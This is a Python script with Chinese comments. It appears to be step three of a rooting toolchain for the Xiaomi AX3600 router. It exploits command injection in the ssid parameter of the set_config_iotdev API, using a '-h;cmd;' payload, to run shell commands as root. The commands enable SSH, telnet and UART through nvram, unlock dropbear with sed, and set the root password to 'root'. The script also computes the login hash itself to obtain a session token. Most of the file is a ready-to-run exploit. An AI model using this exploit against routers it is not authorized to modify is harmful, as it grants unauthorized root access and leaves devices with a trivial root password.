#!/usr/bin/env python3
# AX3600 步骤 3：通过 set_config_iotdev 命令注入启用 SSH
#
# 适用机型: 小米 AX3600 (R3600) — IPQ8071A, newEncryptMode=0 (SHA1)
# 默认 IP:  192.168.31.1
#
# 漏洞利用: POST /api/misystem/set_config_iotdev 的 ssid 参数是 hostapd 配置
#   写入点，未充分过滤 `-h` 后的 `;` 分隔符。`-h;cmd;` 形式可触发 hostapd
#   以 shell 调用解析时执行任意命令。无需时间操控 / scene 注入 / 任何辅助 WiFi。
#
# 注入序列（4 步，全部一次 POST 完成）:
#   1) nvram set + commit（ssh/telnet/uart/bootflag）
#   2) sed 修改 dropbear 配置（AX3600 的 release 锁是 channel=）
#   3) 设 root 密码（echo -e + passwd 重定向）
#   4) dropbear restart（无需重启路由器）
#
# SSH: root@192.168.31.1 / 密码: root
#
# 输出: stdout = 单个 JSON  {"ok": bool, "step": ..., "data"|"error": ...}
#       stderr = 默认空白，--debug 时打印进度
#       exit  = 0 成功 / 1 失败

import argparse
import hashlib
import json
import random
import re
import socket
import sys
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone

# ============ 常量（仅网络层默认） ============
DEFAULT_ROUTER_IP = "192.168.31.1"
DEFAULT_TIMEOUT = 30
STEP_NAME = "enable_ssh"
DEBUG = False


# ============ 日志 / 输出 ============
def log(msg: str, level: str = "INFO") -> None:
    if not DEBUG:
        return
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"{ts} [{level}] {msg}", file=sys.stderr)


def emit_ok(data: dict) -> None:
    print(json.dumps({"ok": True, "step": STEP_NAME, "data": data},
                     ensure_ascii=False))


def emit_err(error: str) -> None:
    print(json.dumps({"ok": False, "step": STEP_NAME, "error": error},
                     ensure_ascii=False))


# ============ 注入核心 ============
def inject(ip: str, stok: str, command: str, timeout: int) -> dict:
    """通过 set_config_iotdev 的 ssid 参数注入单条 shell 命令

    ssid 字段格式: "-h;<command>;"
    hostapd 接收到 ssid="..." 时用 shell 解析 -h 标志后的字符串，
    ; 被作为命令分隔符执行后续内容。

    注意: ssid 字段对 ` ;` `\n` 有过滤；本实现用单层 `;` 注入整条命令。
    """
    ssid = "-h;" + command + ";"
    params = urllib.parse.urlencode({
        "bssid": "Xiaomi",
        "user_id": "longdike",
        "ssid": ssid,
    })
    url = (f"http://{ip}/cgi-bin/luci/;stok={stok}"
           f"/api/misystem/set_config_iotdev?{params}")
    log(f"inject: {command[:60]}{'...' if len(command) > 60 else ''}")
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except Exception as e:
        # 部分场景返回非 JSON（ubus 失败），按"成功已下发"处理
        return {"code": 0, "_note": f"non-json: {str(e)[:200]}"}


# ============ 等待 SSH 端口 ============
def wait_ssh_port(ip: str, timeout: int = 30) -> dict:
    """轮询 TCP 22 是否就绪"""
    log(f"等待 {ip}:22 就绪 (最长 {timeout}s)")
    start = time.time()
    polls = 0
    while time.time() - start < timeout:
        try:
            s = socket.create_connection((ip, 22), timeout=2)
            s.close()
            elapsed = int(time.time() - start)
            return {"ssh_ok": True, "elapsed_sec": elapsed, "polls": polls}
        except (OSError, socket.timeout):
            polls += 1
            time.sleep(1)
    return {"ssh_ok": False, "elapsed_sec": timeout, "polls": polls}


# ============ 4 步注入序列 ============
INJECT_COMMANDS = [
    # Step 1: nvram 启用 SSH/telnet/uart + 启动标志
    ("nvram 启用 SSH/telnet/uart/bootflag",
     "nvram set flag_last_success=0; "
     "nvram set flag_boot_rootfs=0; "
     "nvram set boot_wait=on; "
     "nvram set uart_en=1; "
     "nvram set telnet_en=1; "
     "nvram set ssh_en=1; "
     "nvram commit"),
    # Step 2: sed 解除 dropbear channel 锁
    # (AX3600 的 release 锁形式是 channel= ，不同于 AX6 的 release=)
    ("sed 解除 dropbear channel 锁",
     "sed -i 's/channel=.*/channel=\"debug\"/g' /etc/init.d/dropbear"),
    # Step 3: 设 root 密码 = root
    ("设 root 密码",
     "echo -e \"root\\nroot\" > /tmp/psw.txt; "
     "passwd root < /tmp/psw.txt; "
     "rm -f /tmp/psw.txt"),
    # Step 4: 重启 dropbear（无需重启路由器）
    ("重启 dropbear",
     "/etc/init.d/dropbear restart"),
]


def enable_ssh(ip: str, stok: str, timeout: int,
               wait_ssh: bool, wait_timeout: int) -> dict:
    results = []
    for label, cmd in INJECT_COMMANDS:
        r = inject(ip, stok, cmd, timeout)
        code = r.get("code")
        if code is not None and code != 0:
            raise RuntimeError(f"{label} 失败: {r}")
        results.append({"step": label, "ok": True})

    out = {
        "ip": ip,
        "ssh_user": "root",
        "ssh_password": "root",
        "ssh_port": 22,
        "inject_results": results,
    }

    if wait_ssh:
        check = wait_ssh_port(ip, wait_timeout)
        out["ssh_ok"] = check["ssh_ok"]
        out["ssh_wait"] = check
        if not check["ssh_ok"]:
            raise RuntimeError(f"注入完成但 SSH 未就绪 ({check})")

    return out


# ============ stdin 喂 stok ============
def read_stok_from_stdin() -> str:
    """从 stdin 读上游 JSON，提取 data.stok"""
    raw = sys.stdin.read().strip()
    if not raw:
        return ""
    try:
        d = json.loads(raw)
        return d.get("data", {}).get("stok", "") or d.get("stok", "")
    except json.JSONDecodeError:
        return ""


# ============ 备用: 自己登录拿 stok (运行时探测 KEY/加密模式) ============
def fetch_crypto(ip: str, timeout: int) -> tuple[str, int]:
    """返回 (key, new_encrypt_mode)；mode=1 → SHA256，否则 SHA1"""
    html = http_get_raw(f"http://{ip}/init.html", timeout)
    m = re.search(r"/static/js/(init\.[a-f0-9]+\.js)", html)
    if not m:
        raise RuntimeError("未在 init.html 找到 init.*.js 引用")
    js = http_get_raw(f"http://{ip}/static/js/{m.group(1)}", timeout)
    key_m = re.search(r'\bkey\s*:\s*"([0-9a-f]{32})"', js)
    if not key_m:
        raise RuntimeError("JS 里未找到 key 字段")
    mode_m = re.search(r"\bnewEncryptMode\s*[:=]\s*(\d+)", js)
    mode = int(mode_m.group(1)) if mode_m else 0
    return key_m.group(1), mode


def _hex(algo, s: str) -> str:
    return algo(s.encode("utf-8")).hexdigest()


def calc_login_pwd(nonce: str, pwd: str, key: str, mode: int) -> str:
    if mode == 1:
        return hashlib.sha256((nonce + _hex(hashlib.sha256, pwd + key)).encode()).hexdigest()
    return hashlib.sha1((nonce + _hex(hashlib.sha1, pwd + key)).encode()).hexdigest()


def login_get_stok(ip: str, pwd: str, timeout: int) -> str:
    key, mode = fetch_crypto(ip, timeout)
    n = f"0__{int(time.time())}_{random.randint(0, 9999)}"
    pwd_hash = calc_login_pwd(n, pwd, key, mode)
    url = (f"http://{ip}/cgi-bin/luci/api/xqsystem/login"
           f"?username=admin&logtype=2&nonce={n}"
           f"&password={pwd_hash}&init=0")
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        r = json.loads(resp.read().decode("utf-8"))
    if r.get("code") != 0:
        raise RuntimeError(f"登录失败: {r.get('msg', r)}")
    return r["token"]


def http_get_raw(url: str, timeout: int) -> str:
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8")


# ============ CLI ============
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="AX3600 步骤 3：通过 set_config_iotdev 注入开 SSH",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  # 上游管道喂 stok\n"
            "  python3 2.login_get_stok.py --pwd adminpass123 | python3 3.enable_ssh.py\n"
            "\n"
            "  # 显式传 stok\n"
            "  python3 3.enable_ssh.py --stok <token> --wait\n"
            "\n"
            "  # 直接传密码（脚本自己登录拿 stok）\n"
            "  python3 3.enable_ssh.py --pwd adminpass123 --wait\n"
        ),
    )
    p.add_argument("--ip", default=DEFAULT_ROUTER_IP,
                   help=f"路由器 IP（默认: {DEFAULT_ROUTER_IP}）")
    p.add_argument("--stok", default="",
                   help="stok 令牌（不传则从 stdin 读，再否则用 --pwd 自己登录）")
    p.add_argument("--pwd", default="",
                   help="管理员密码（未传 --stok 时使用）")
    p.add_argument("--wait", action="store_true",
                   help="等待 SSH 端口 22 就绪后返回（默认不等待）")
    p.add_argument("--wait-timeout", type=int, default=30,
                   help="SSH 等待超时秒（默认: 30）")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                   help=f"HTTP 超时秒（默认: {DEFAULT_TIMEOUT}）")
    p.add_argument("--debug", action="store_true",
                   help="打印进度日志到 stderr（默认静默，仅输出 JSON）")
    return p.parse_args()


def main() -> int:
    global DEBUG
    args = parse_args()
    DEBUG = args.debug

    # 解析 stok: 命令行 > stdin > 自己登录
    stok = args.stok or read_stok_from_stdin()
    if not stok:
        if not args.pwd:
            emit_err("必须传 --stok 或 --pwd")
            return 2
        try:
            log(f"用 --pwd 自己登录拿 stok")
            stok = login_get_stok(args.ip, args.pwd, args.timeout)
        except Exception as e:
            emit_err(str(e))
            return 1

    try:
        data = enable_ssh(args.ip, stok, args.timeout,
                          args.wait, args.wait_timeout)
    except Exception as e:
        log(str(e), level="ERROR")
        emit_err(str(e))
        return 1
    emit_ok(data)
    return 0


if __name__ == "__main__":
    sys.exit(main())